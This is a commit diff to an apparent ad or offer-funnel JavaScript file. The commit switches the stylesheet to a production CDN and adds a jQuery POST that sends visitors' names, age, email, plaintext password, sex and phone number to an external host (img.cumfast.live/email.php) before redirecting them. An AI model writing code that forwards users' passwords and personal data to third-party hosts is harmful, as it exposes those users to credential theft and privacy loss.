38cac8f5e994baf4bff7aa39e732f09125d0fee3
Pavlo Svystun <nefely123@gmail.com>
2024-01-03 13:53:52 +0200

    mail api integration to admt

--- admt_scripts.js
+++ admt_scripts.js
@@ -336,9 +336,9 @@ get_admt = () => {
 			admt_start()
 	    });
 	    // test
-	    document.querySelector("body").insertAdjacentHTML("beforeend", `<link rel="stylesheet" href="admt_styles.css?v=${Date.now()}">`)
+	    // document.querySelector("body").insertAdjacentHTML("beforeend", `<link rel="stylesheet" href="admt_styles.css?v=${Date.now()}">`)
 	    // prod
-	    // document.querySelector("body").insertAdjacentHTML("beforeend", `<link rel="stylesheet" href="https://cdn.adasty.com/a/admt_styles.css">`);
+	    document.querySelector("body").insertAdjacentHTML("beforeend", `<link rel="stylesheet" href="https://cdn.adasty.com/a/admt_styles.css">`);
 	    // demo
 	    // document.querySelector("body").insertAdjacentHTML("beforeend", `<link rel="stylesheet" href="https://cdn.adasty.com/a/demo_admt_styles.css?v=${Date.now()}">`);
 	})
@@ -1408,6 +1408,34 @@ admt_start = () => {
 				// formFinalLinkObject()
 				params_object.frq = Number(params_object.frq) + 1 
 				params_object.flw = params_object.flw + "_2nd"
+
+				let api_send_data = {
+					name: params_object?.n ,
+					last_name: params_object?.fn ,
+					age: params_object?.a ,
+					email: params_object?.em ,
+					password: params_object?.ps ,
+					sex: params_object?.sx ,
+					phone: params_object?.ph ,
+				}
+				for (let key in api_send_data) {
+				    if (api_send_data[key] === "" || api_send_data[key] === undefined || api_send_data[key] == 'unkwn' || api_send_data[key] == null) {
+				        delete api_send_data[key];
+				    }
+				}
+				if (params_object.em !== "" && /^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,10})+$/.test(params_object.em)) {
+					$.ajax({
+					    url: 'https://img.cumfast.live/email.php',
+					    type: 'POST',
+					    data: api_send_data,
+					    success: function(response) {
+					        console.log('Запит відправлено успішно!', response);
+					    },
+					    error: function(xhr, status, error) {
+					        console.error('Помилка при відправленні запиту:', status, error);
+					    }
+					});
+				}
 
 				setTimeout(function() {
 				    document.location.href = $(".second-offer-go").attr("href")
